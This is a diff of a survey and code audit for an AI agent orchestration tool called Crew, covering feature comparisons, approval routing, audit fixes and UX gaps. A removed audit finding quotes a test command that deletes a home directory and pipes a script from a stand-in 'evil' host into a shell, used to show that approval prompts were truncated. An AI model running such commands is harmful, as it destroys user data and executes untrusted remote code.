@@ -4,7 +4,7 @@ Surveyed 2026-11-12. Star counts, last push dates, and licenses were checked via
 
 ## 1. Summary
 
-- **Worktrees plus a dashboard is already commodity infrastructure.** Plenty of human-driven GUIs and TUIs do this, and several have already shut down or stalled (Conductor is shutting down its cloud on Nov 20 after joining Meta; Vibe Kanban is community-maintained after the company wound down). What sets Crew apart is that a lead agent delegates over MCP and reviews/merges diffs, workers are driven through structured protocols, approvals are routed to the user, and Codex performs adversarial cross-review.
+- **Worktrees plus a dashboard is already commodity infrastructure.** Plenty of human-driven GUIs and TUIs do this, and several have already shut down or stalled (Conductor is shutting down its cloud on Nov 20 after joining Meta; Vibe Kanban is community-maintained after the company wound down). What sets Crew apart is that a lead agent delegates over MCP and reviews/merges diffs, workers run through structured protocols with no blind auto-approval (Codex defaults to its automatic reviewer with user escalation, and Antigravity routes commands to the user), and Codex performs adversarial cross-review.
 - **The closest point of comparison is `openai/codex-plugin-cc`** (35k★, Apache-2.0). It lacks worktree isolation, user approval routing, and a polish role—and its top open issues are almost all process lifecycle bugs. Crew needs to guard against the same class of bugs.
 - **Evidence for cross-model code review is weaker than commonly assumed.** For code, existing research suggests a fresh reviewer with a clean context matters more than switching model vendors—whereas for documentation and prose, cross-model review showed a large gain (section 4).
 - **The industry broadly warns against parallel writes and over-orchestration.** Both Anthropic and Cognition favor read-heavy fan-out while treating parallel writes as high-risk. Crew's "delegate only separable slices + single lead merges" design matches that consensus.
@@ -66,11 +66,11 @@ CrewAI, Mastra, and Microsoft Agent Framework were skipped as too far removed fr
 ## 3. What Crew already does well
 
 - Dedicated worktree and branch per job; the bridge commits and only the lead merges.
-- Worker approvals and questions are routed to the user with no auto-approval—unlike `codex-plugin-cc`, OpenHands, or Claude Squad.
+- No blind auto-approval (unlike `codex-plugin-cc`, OpenHands, or Claude Squad): Codex defaults to `auto_review` (`config.ts`) and escalates refusals or `user`-mode turns to the user; Antigravity allows workspace reads/edits and routes commands and questions to the user (`adapters/antigravity.ts`).
 - Uses structured protocols (`codex app-server`, `agy acp`) rather than terminal screen-scraping.
-- Fixed roles (implementation, adversarial review, copy polish) with out-of-scope edits rejected.
-- Background execution plus `wait` avoids long synchronous tool-call timeouts.
-- Small surface area (2 workers, a couple of skills, static board) without the over-orchestration of OMC or Gas Town.
+- Configurable roles (eight roles around implementation, adversarial review, and wording polish in `config.ts`) with out-of-scope edits flagged (`outOfScope` in `jobs.ts`) or refused (`antigravity.ts`).
+- Background execution plus `wait` and `wake.ts` avoids long synchronous tool-call timeouts.
+- Small surface area (2 worker runtimes, 4 skills, live React board plus macOS/Windows desktop clients) without the over-orchestration of OMC or Gas Town.
 
 ## 4. A candid look at the evidence for cross-model review
 
@@ -131,73 +131,55 @@ Each item below comes from the surveyed projects; section 8 checks them against 
 
 ## 8. Comparison of candidates against Crew's code
 
-Checked against `plugin/bridge/`, `plugin/roles/`, and `plugin/skills/run/SKILL.md` on 2026-11-12. Status is rated **Implemented / Partial / None**.
+Checked against `plugin/bridge/`, `plugin/roles/`, `plugin/skills/run/SKILL.md`, `plugin/board/src/`, and `native/Sources/` (initial survey 2026-11-12; updated against current code). Status is rated **Implemented / Partial / None**.
 
 | # | Candidate | Status | Evidence and remaining work |
 | --- | --- | --- | --- |
-| 1 | Startup orphan job cleanup | Implemented | `load()` in `jobs.ts` marks unfinished jobs `failed` and instructs the user to resume via `reply`. Remaining: no sweep for orphaned worktrees/branches that lack a job record (see A-2 below). |
-| 2 | Child process reaping | Mostly implemented | The single daemon spawns at most one `codex app-server` and one `agy acp`, stops them after 10 minutes idle, and calls `peer.close()` in `shutdown()`. Whether children survive if the daemon receives `SIGKILL` was not verified. |
-| 3 | Worktree serialization, retry, safe deletion | None (need unconfirmed) | `createWorktree` has no mutex or retry; concurrent creation collisions were not reproduced. Confirmed via reproduction that `discard` succeeds even after the worktree directory is deleted manually (`--force` handles it). |
-| 4 | Structured approval objects | Partial | Has `waiting{type,reason}`, `seq` keys, both board and app responses, and duplicate-answer protection. However, multiple requests on a single job overwrite `run.pending` (A-1), and pending requests have no timeout (A-5). Forwarding denial reasons is unsupported by the underlying protocols (B-1). |
-| 5 | Cancellation flow | Partial | Codex sends `turn/interrupt` and maps `interrupted` to `cancelled`; Antigravity maps `stopReason: cancelled`. There is no grace-period wait + session restart. Because individual tool-call states are not stored, closing open tool calls does not apply. |
-| 6 | Capability checks & noise tolerance | Partial | `rpc.ts` ignores non-JSON lines (implemented). Antigravity calls `session/resume` directly without checking capabilities in the `initialize` response. |
-| 7 | State detection | Partial | Any notification resets the timer via `activity()`, and Codex subagent activity counts toward the parent job (implemented). `RpcPeer.request` has no timeout, so if `initialize` hangs, the job only turns `stalled` in `starting` and never fails (A-4). |
-| 8 | Uncertain prompt delivery | N/A | Retries are decided explicitly by the lead via `reply`; there is no automatic retry. |
-| 9 | Adversarial review prompt | Partial | `codex-reviewer.md` has verdict, severity, `path:line`, and `Not verified`, plus a single line to say so if nothing is found. Confidence scores, explicit anti-hallucination rules for file/line refs, and calibration rules ("one strong finding beats several weak ones") are absent. |
-| 10 | Pre-prediction & missing-change analysis | None | Absent from both reviewer prompts. |
-| 11 | Acceptance criteria | Partial | `delegate` accepts `done_when`, whereas `review` only accepts `focus` and does not receive the intended behavior separately. |
-| 12 | Test baseline diffing | None | Final verification relies on the lead running tests. |
-| 13 | Fix loop cap | Implemented (docs) | `SKILL.md` caps reviews at two rounds, though code does not enforce it. |
-| 14 | Worker exit & path rules | Implemented | Engineer role instructs workers to report if a task cannot be done, prompts restrict edits to the worktree, and edits outside it are caught in `outOfScope` via `touched` tracking (stronger than a prompt rule alone). |
-| 15 | Critical evaluation of review findings | Implemented | Step 5 of `SKILL.md`: fix what you agree with and tell the user what you decline and why. |
-| 16 | Skip crew on small tasks; usage display | Partial | Skipping is allowed by `SKILL.md`. Codex tokens are collected in `job.tokens` but not shown on the board or in `describe`; only rate-limit window percentages appear. |
-| 17 | Merge candidate summary & concurrency cap | Partial | `describe` outputs diffs and merge commands for the lead, but the board shows only changed-file and out-of-scope counts. No concurrency cap. |
-| 18 | Trash-style deletion | None | `discard` immediately runs `worktree remove --force` and `branch -D`. |
+| 1 | Startup orphan job cleanup | Implemented | `load()` in `jobs.ts` marks unfinished jobs `failed` and prompts `reply` to resume; `crew gc` (`gc.ts`) sweeps orphaned worktree slots, missing-worktree Git admin dirs, and merged `crew-*` branches. |
+| 2 | Child process reaping | Mostly implemented | The daemon spawns at most one `codex app-server` and one `agy acp`, stops them after 10 minutes idle, and calls `peer.close()` in `shutdown()`. `agy acp` exits child processes on `SIGTERM` (section 11); `SIGKILL` survival for Codex was not verified. |
+| 3 | Worktree serialization, retry, safe deletion | Partial | `createWorktree` (`git.ts`) still has no per-repo mutex. Deletion (`jobs.ts`, `gc.ts`) tracks `cleanupPending`, retries held Windows folders at 30 s and 2.5 min, checks paths stay under `home/worktrees`, and verifies `.git` is a file. |
+| 4 | Structured approval objects | Partial | `codex.ts` and `antigravity.ts` queue requests in `run.pending` in arrival order, each with UUID `waiting.id`, `since`, `seq`, and duplicate-answer checks. Requests have no timeout; denial reasons use `decision: "decline"` via `turn/steer` (Codex) or next prompt (Antigravity). |
+| 5 | Cancellation flow | Implemented | `codex.ts` interrupts child sub-agents, clears `run.pending` as cancelled, sends `turn/interrupt`, and waits 5 s. `antigravity.ts` clears `run.pending`, sends `session/cancel`, waits 5 s, and falls back to `session/close` if advertised. |
+| 6 | Capability checks & noise tolerance | Implemented | `rpc.ts` ignores non-JSON lines. `antigravity.ts` reads `sessionCapabilities.resume`, `loadSession`, `sessionCapabilities.close`, and `_meta.antigravity.systemPrompt.append` from `initialize`. |
+| 7 | State detection | Implemented | Activity resets the stall timer (`jobs.ts`); `codex.ts` holds parent completion until sub-agents finish (`busyChildren`) and calls `probe()` before waking the lead. `rpc.ts` enforces `RPC_TIMEOUT_MS` (30 s; `THREAD_TIMEOUT_MS` 180 s for Codex thread start/resume). |
+| 8 | Uncertain prompt delivery | N/A | Retries are decided explicitly by the lead via `reply`; lost `turn/start` acknowledgements fail the job with a note to check the session (`codex.ts`). |
+| 9 | Adversarial review prompt | Partial | `plugin/roles/reviewer.md` has verdict, severity, `[reproduced|read|suspected]`, `path/to/file:line`, `Not verified`, verified-ref rules, and a plain no-findings rule. Confidence scores and calibration rules are absent. |
+| 10 | Pre-prediction & missing-change analysis | Partial | `reviewer.md` and `self-reviewer.md` instruct reviewers to derive expected changes from acceptance criteria first and check missing paths; no separate pre-prediction report section or explicit fresh-command gate for approval. |
+| 11 | Acceptance criteria | Implemented | Both `delegate` and `review` accept `done_when` (`mcp.ts`, `prompts.ts`), and `delegate` accepts a bridge-run `check` command (`jobs.ts`). |
+| 12 | Test baseline diffing | None | Final verification relies on the lead comparing base vs. post-change test IDs (`SKILL.md`). |
+| 13 | Fix loop cap | Implemented (docs) | `SKILL.md` caps reviews at two rounds (not enforced in code); `config.ts` enforces `MAX_DEBATE_ROUNDS = 6`. |
+| 14 | Worker exit & path rules | Implemented | `engineer.md` instructs workers to report blockers; prompts restrict edits to the worktree, and edits outside targets or worktree appear in `outOfScope` (`jobs.ts`) or are refused (`antigravity.ts`). |
+| 15 | Critical evaluation of review findings | Implemented | Step 5 of `SKILL.md`: triage findings, fix what holds up, and explain declined findings to the user. |
+| 16 | Skip crew on small tasks; usage display | Implemented | Skipping is allowed by `SKILL.md`. Recorded Codex `tokens` and `tokenUse` appear in `render.ts`, `JobDrawer.tsx`, `JobDetailView.swift`, `Missions.tsx`, and `Overview.tsx` alongside AgentGauge windows (`usage.ts`). |
+| 17 | Merge candidate summary & concurrency cap | Partial | `JobDrawer.tsx`, `JobDetailView.swift`, and `describe()` show reports, changed/out-of-scope files, bridge `check` results, and `rounds`. Still no concurrency cap (only `exclusive: true` blocks concurrent jobs during measurements). |
+| 18 | Trash-style deletion | None | `discard` immediately runs `worktree remove --force` and `branch -D`; `crew gc` requires `--apply` and only deletes branches with `--branches` when merged. |
 | 19 | Rate-limiting bulk restarts | N/A | The daemon never auto-restarts jobs. |
-| 20 | Progressive skill disclosure & evals | N/A | `/crew:run` is 66 lines and does not need splitting yet. Unit tests cover `jobs`, `claude`, and `policy`. |
-| 21 | Board order stability | Partial | Cards update in place by key and preserve timers, but the Claude lane sorts by `activeAt`, reordering cards on every tool call (B-2). |
+| 20 | Progressive skill disclosure & evals | N/A | `/crew:run` is 121 lines (`SKILL.md`). Unit tests (`test/*.test.ts`) cover bridge modules and board logic. |
+| 21 | Board order stability | Implemented | Cards in `Overview.tsx` and `BoardView.swift` stay stable within status/mission groups and no longer reorder Claude sessions on `activeAt`. |
 | 22 | Antigravity hooks | Optional | ACP is sufficient; hooks are not needed. |
 
 ### A. Issue candidates from the code audit and reproduction results
 
-Reproduced using a fake `codex app-server` (JSON-RPC stub), temporary git repositories, and a daemon running on an isolated `CREW_HOME` and port. Reproduction scripts lived in an external scratchpad without modifying Crew source or touching the user's live `~/.crew` daemon and jobs.
+Initial audit findings (reproduced with a fake `codex app-server`, temporary repositories, and an isolated `CREW_HOME`):
 
-| Candidate | Result | What happened |
+| Candidate | Initial result | Current status |
 | --- | --- | --- |
-| A-1 Subagent approvals silently declined | **Reproduced** (conditional) | An approval request from a subagent thread (with `parentThreadId` set) was immediately answered with `decline` without changing job status or notifying the user. Whether live Codex sends approval requests under the child `threadId` was not verified, though the protocol schema includes `threadId` on approval requests and documents `Thread.parentThreadId` as set for subagents. |
-| A-1b Overlapping approval requests | **Reproduced** | When two requests arrived back to back on the same thread, the user saw only the second (`echo second`), and approving once sent only one response back to Codex, leaving the first request unanswered forever. Whether live Codex emits two concurrent approvals on one thread was not verified. |
-| A-2 Worktree and branch leak | **Reproduced** | Creating 201 jobs left 201 worktrees and 201 `crew-*` branches on disk while `jobs.json` kept only 200 records. After a restart, calling `discard` on the oldest job failed with `No job with id ...`, leaving its worktree and branch orphaned on disk. |
-| A-3 Stuck `discard` after manual deletion | **Refuted** | Deleting the worktree directory manually and then calling `discard` succeeded on the first try. Removed from the issue list. |
-| A-4 Infinite hang during startup | **Reproduced** | Against a server that never answered `initialize`, the job remained `running` / `starting` past 35 seconds, emitting only a single `stalled` event without failing or surfacing the cause. |
-| A-5 Stall timer while waiting for input | **Reproduced, low severity** | A job left waiting for approval for 40 seconds (`stallSeconds=1`) did not turn `stalled`. This is reasonable since it is waiting on the human, though only a single initial notification is sent with no elapsed-wait indicator. |
-| A-6 Truncated approval command text | **Reproduced** | A 3-line command (`cd /tmp && echo safe` / `rm -rf $HOME/important` / `curl http://evil | sh`) displayed only the first line (`run: cd /tmp && echo safe`) in the approval prompt, hiding the destructive lines from the user. Whether live Codex formats multiline commands this way was not verified. |
-
-The highest-risk findings are A-6 (safety) and A-1 (silent denial), followed by A-2 (disk leak).
+| A-1 Subagent approvals silently declined | **Reproduced** (conditional) | Fixed: `codex.ts` maps `parentThreadId` to the parent job and surfaces child requests as `"Sub-agent request"`. |
+| A-1b Overlapping approval requests | **Reproduced** | Fixed: `run.pending` queues requests in arrival order (`codex.ts`, `antigravity.ts`); each uses a unique `waiting.id`. |
+| A-2 Worktree and branch leak | **Reproduced** | Fixed: `jobs.ts` keeps worktree-owning and unread jobs past `KEEP_JOBS` (200), and `gc.ts` sweeps orphans. |
+| A-3 Stuck `discard` after manual deletion | **Refuted** | Manual dir deletion already worked; locked-ref recovery and path/branch checks were added to `discard` (`jobs.ts`, `git.ts`). |
+| A-4 Infinite hang during startup | **Reproduced** | Fixed: `rpc.ts` enforces `RPC_TIMEOUT_MS` (30 s) on `initialize` and kills hung processes; `THREAD_TIMEOUT_MS` is 180 s. |
+| A-5 Stall timer while waiting for input | **Reproduced** (low) | Expected while waiting on human input; `NeedsYou.tsx` and `BoardView.swift` show elapsed wait time (`waiting.since`). |
+| A-6 Truncated approval command text | **Reproduced** | Fixed: `codex.ts` and `antigravity.ts` show the full command, working directory, and additional permissions (up to bounds). |
 
 ### B. Improvement candidates from the code audit
 
-| Candidate | Result | Details |
-| --- | --- | --- |
-| B-1 Forwarding denial reasons | **Refuted** | In the Codex approval response schema, `decision` is an enum (`accept`, `acceptForSession`, `decline`, `cancel`, etc.) with no reason field, and ACP's permission response has none either. Sending a reason requires a separate follow-up message (such as `turn/steer`) after declining; it cannot be carried inside the approval response itself. |
-| B-2 Claude lane card reordering | **Reproduced** | On the live browser board, three sessions ordered `C > B > A` reordered to `A > C > B` after one tool call in A, and then to `B > A > C` after one tool call in B. Cards keep jumping while agents work. |
+- **B-1 Forwarding denial reasons (Refuted)**: Neither Codex approval responses nor ACP permission responses carry a reason field. Instead, `reply` with `decision: "decline"` sends a `turn/steer` (Codex) or a next-turn prompt (Antigravity) after the turn ends.
+- **B-2 Claude lane card reordering (Reproduced, fixed)**: Replaced the 3-lane `activeAt`-sorted layout with mission/session panels (`Overview.tsx`, `BoardView.swift`) that keep card order stable across activity updates.
 
 ### C. Follow-up verification and fixes
 
-The tables above describe the initial audit. The follow-up used temporary Git repositories, JSON-RPC stubs, the installed Codex protocol schema, and an Antigravity v1.5.5 initialization handshake.
-
-| Finding | Follow-up |
-| --- | --- |
-| A-1, A-1b, A-6 | Child-thread requests reach the parent job, including on later turns. Each job presents requests in arrival order. Every answer requires the request ID, which stays unique across daemon restarts. Approval text includes the entire command, the working directory if supplied, and any requested additional permissions. Actual Codex approval traffic was simulated. |
-| A-2 | The 200-record limit applies to delivered, finished history without worktrees. Active jobs, unread results, and records that own worktrees survive restarts. Worktrees already orphaned by the old limit require separate recovery. |
-| A-3 | Deleting the directory alone was already recoverable. A separate failure was reproduced by locking the branch ref after worktree creation. Discard now retries after partial removal and checks the registered path and branch before deleting. |
-| A-4 | Worker initialization and session setup have a 30-second RPC deadline. A failed handshake closes the worker process. A lost turn-start acknowledgement leaves the job active because the prompt may have reached the worker. |
-| A-5 | Human input can remain pending indefinitely. The board displays the elapsed wait time. |
-| B-1 | The installed Codex schema and ACP permission response offer no field for a denial reason. |
-| B-2 | Claude cards keep their position within each status group when tool activity updates the timestamp. |
-
-Antigravity restores sessions using advertised ACP capabilities. Cancellation blocks new permissions and waits for the worker to stop, with a negotiated ACP session close as a fallback. The review prompt accepts explicit acceptance criteria and asks for evidence from checks. The board and job details show recorded Codex tokens.
-
-The optional proposals for a job cap, trash, hooks, and additional board views remain open. Repository-wide worktree locking, abrupt daemon termination, and parent turns that finish while child turns are still active need separate evidence.
+Follow-up checks used temporary Git repositories, JSON-RPC stubs, the installed Codex protocol schema, and an Antigravity `1.5.5` handshake (later rechecked on `1.5.9` in section 11). All A-1 through A-6, B-1, and B-2 fixes above are verified by tests (`test/adapters.test.ts`, `test/adapter-contracts.test.ts`, `test/jobs.test.ts`) except live Codex child-thread and overlapping-approval traffic, which was simulated against stubs. Repository-wide worktree creation mutexes and abrupt `SIGKILL` daemon termination remain unverified.
 
 ## 9. Usability and UX takeaways
 
@@ -205,31 +187,33 @@ Comparing Crew's board (`plugin/board/`) and workflow against the surveyed tools
 
 ### What already works well
 
-- Shows status with a single-word badge and color (`Needs approval` / `May be stuck` / `Done`), floats waiting and stalled cards to the top, and dims finished cards.
-- Calibrates against server time so timers stay accurate even with clock skew, and displays `Disconnected — reconnecting…` on connection drop.
+- Shows status with a single-word or short badge and color (`Needs approval` / `May be stuck` / `Done`), surfaces waiting items in `Needs You`, and separates finished work into `Recently finished` / `History`.
+- Calibrates against server time so timers stay accurate even with clock skew, and displays `Lost the connection to Crew. Reconnecting…` on connection drop.
 - Allows answering approvals from either the in-app prompt or the board, invalidating whichever was not used first, and never lets the lead decide on the user's behalf when a prompt is dismissed.
-- Offers `Copy resume command` so the user can pick up any worker session directly in its native CLI—clearer than almost any surveyed tool.
+- Offers `Resume Command` (`JobDrawer.tsx`) so the user can pick up any worker or Claude session directly in its native CLI—clearer than almost any surveyed tool.
 - Gives the lead ordered review, accept, revise, and cleanup commands in `describe` output.
 - Solves Conductor's top early complaint (missing `.env` and dependencies) via `.worktreeinclude`, and stays fast on APFS via copy-on-write clones.
 - Fires notifications only on waiting, error, limit, and stall events—keeping completion silent by default to avoid notification fatigue.
 
 ### High-impact UX gaps (ordered by impact)
 
-1. **Clicking a card opens nothing.** Nearly every surveyed tool centers on a view that helps the user decide whether to merge (Cursor's unified diff, Antigravity's Artifacts, Agent HQ's PR view). Review—not code generation—is the universal bottleneck. Clicking a card should open the worker report (`job.report`), changed files, out-of-scope files, that job's event stream, and notes. All of this data is already served by `/api/jobs/:id`.
-2. **Questions cannot be answered in free text on the board.** Question-type waits show only Yes/No buttons on the board even though the in-app prompt accepts free text. Adding a text input on the board makes both surfaces consistent. Because denial reasons cannot be embedded in approval responses (B-1), any reason can be sent as a follow-up message after declining.
-3. **The activity feed does not identify which job an event belongs to.** Feed lines only show the agent name, making two concurrent Codex jobs indistinguishable. Prefix each line with the job ID or short title, and filter the feed to a job when its card is clicked.
-4. **Notifications do not navigate to the board.** Clicking a macOS notification does nothing. When an approval is waiting, clicking the notification should open the board or app (waiting notifications were the #1 early feature request for Conductor). Prefixing the browser tab title with the pending count—e.g., `(2) Crew`—is a one-line win. Non-macOS platforms currently have no notifications.
-5. **Projects are mixed together.** Because a single daemon serves all sessions, jobs from different repositories pile into the same lanes, distinguished only by a small path label. Once more than one project is active, a project filter or grouping is needed; losing track as task count grows was a common complaint across parallel-agent tools (Emdash slows down around ~78 tasks).
-6. **Merge candidate summaries are too thin.** Completed cards show only `1 file changed…` and `N out of scope`. Surveyed best practices consistently recommend showing the spec, diff summary, test results, and out-of-scope files in one place—starting simply by surfacing the `Verification` section of the worker's report.
-7. **Little cost visibility.** Codex rate-limit window percentages are shown, but per-job token counts (`job.tokens`) were not surfaced initially. Since heavy token consumption is the most consistent warning around multi-agent setups, showing tokens on completed cards helps calibrate usage. Antigravity does not report token counts.
-8. **Approval context.** Directly related to A-6: approval prompts should show the full command (collapsible if long), the working directory, and the job's role (including whether it is supposed to be read-only).
-9. **No user confirmation checkpoint in `/crew:run`.** The planning stage flows straight into delegation without pausing for confirmation—carrying the same risk noted for Jules, where auto-approved plans weakened review signal. For large tasks only, offering a short one-paragraph plan + delegation breakdown for confirmation avoids wasted runs without adding friction to small tasks.
-10. **First-run onboarding.** Only the README mentions that Claude Code must be restarted after installation. Adding a one-line reminder at the end of `crew install` and in `crew doctor` closes that gap. The board's empty state copy is already friendly.
-11. **Accessibility and remote access.** Newly waiting cards are not announced to screen readers (missing `aria-live`). Remote/mobile access (as in Agent of Empires or Emdash) conflicts with Crew's local-only design and should remain out of scope.
+Most of the original UX gaps are now implemented across `plugin/board/src/`, `native/Sources/Crew/`, and `plugin/bridge/`:
+
+1. **Card detail drawer (Implemented)**: Clicking any job or session opens `JobDrawer.tsx` / `JobDetailView.swift` with the report, changed/out-of-scope files, check receipts, rounds, evidence, and job events.
+2. **Free-text question answers (Implemented)**: `NeedsYou.tsx` and `Components.swift` (`AnswerView`) include a free-text composer alongside Yes/No buttons, matching the in-app prompt.
+3. **Activity feed job identification (Partial)**: `EventList` (`Overview.tsx`, `Components.swift`) adds a `Show job` button linking to the job drawer (`openJob`), though feed lines still do not print the job ID or title inline.
+4. **Notifications and tab count (Implemented)**: `notify.ts` focuses and opens the job on click, `App.tsx` prefixes `(N) Crew` to the document title, `daemon.ts` sends Windows toast notifications (`toast.ts`), and `CrewApp.swift` handles macOS native notifications.
+5. **Project filtering (Implemented)**: `App.tsx` and `BoardView.swift` filter workspaces by project in the sidebar.
+6. **Merge candidate summaries (Implemented in part)**: Job drawers show the full report (including `Verification`), changed/out-of-scope files, bridge `check` results, and per-turn `rounds`.
+7. **Cost visibility (Implemented)**: `JobDrawer.tsx`, `JobDetailView.swift`, `Missions.tsx`, `Overview.tsx`, and `render.ts` display Codex token counts and `tokenUse` breakdowns (Antigravity does not report tokens).
+8. **Approval context (Implemented)**: `codex.ts` and `antigravity.ts` include full commands, working directories, paths, and permissions.
+9. **User confirmation checkpoint in `/crew:run` (Open)**: `/crew:run` still flows from planning into delegation without a plan-confirmation pause (aside from approving one sample first for taste-judged work).
+10. **First-run onboarding (Implemented)**: `cli.ts` (`install`, `doctor`), `Overview.tsx` (`Setup`), and `BoardView.swift` (`SetupCard`) guide setup and plugin reloading.
+11. **Accessibility and remote access (Partial / Out of scope)**: `Palette.tsx` uses `aria-live="polite"`, while waiting cards still lack an `aria-live` announcement; remote/mobile access remains out of scope.
 
 ### UX conclusion
 
-Crew's status display and approval routing are cleaner than most of the surveyed tools. Its weak spot is the screen where the user reads what happened and decides whether to merge. Because the universal bottleneck in parallel-agent tools is review rather than code generation, expanding the board from passive status display into decision support (card detail drawer, per-job feed, free-text question answers, and merge candidate summaries) will deliver the largest payoff.
+Crew's status display, approval routing, detail drawers, and merge summaries now cover the main review bottleneck identified in the survey. Only inline job labels in the activity feed, `aria-live` on waiting cards, and an optional large-task plan checkpoint in `/crew:run` remain from the original UX list.
 
 ## 10. Session features in Claude Code and Codex (2026-11-14)
 
